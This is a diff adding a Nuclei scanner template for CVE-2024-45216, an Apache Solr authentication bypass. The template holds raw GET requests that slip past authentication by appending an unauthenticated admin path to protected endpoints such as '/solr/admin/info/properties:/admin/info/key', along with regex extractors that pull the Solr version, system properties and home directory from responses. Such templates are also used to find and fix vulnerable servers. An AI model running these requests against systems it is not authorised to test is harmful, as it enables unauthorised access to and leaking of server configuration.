@@ -1,0 +1,65 @@
+id: SENSITIVE-INFO
+info:
+  name: Apache Solr - Authentication Bypass [CVE-2024-45216]
+  author: Ghost_sec 
+  #____ _               _       ____            
+ #/ ___| |__   ___  ___| |_    / ___|  ___  ___ 
+#| |  _| '_ \ / _ \/ __| __|   \___ \ / _ \/ __|
+#| |_| | | | | (_) \__ \ |_     ___) |  __/ (__ 
+ #\____|_| |_|\___/|___/\__|___|____/ \___|\___|
+                         #|_____|               
+  severity: critical
+
+requests:
+  - raw:
+      - |
+        GET /solr/admin/info/properties:/admin/info/key HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: NucleiSecurityScanner
+
+      - |
+        GET /solr/admin/info/system:/admin/info/properties HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: NucleiSecurityScanner
+
+      - |
+        GET /solr/admin/info/threads:/admin/info/system HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: NucleiSecurityScanner
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "responseHeader"
+          - "system.properties"
+          - "solr.solr.home"
+        condition: and
+
+      - type: word
+        part: content_type
+        words:
+          - "application/json"
+
+      - type: status
+        status:
+          - 200
+          - 206
+
+    extractors:
+      - type: regex
+        part: body
+        name: solr_version
+        regex:
+          - "\"solr-spec-version\":\"([0-9\\.]+)\""
+      - type: regex
+        part: body
+        name: system_info
+        regex:
+          - "\"system.properties\":\"([^\"]+)\","
+      - type: regex
+        part: body
+        name: solr_home
+        regex:
+          - "\"solr.solr.home\":\"([^\"]+)\""
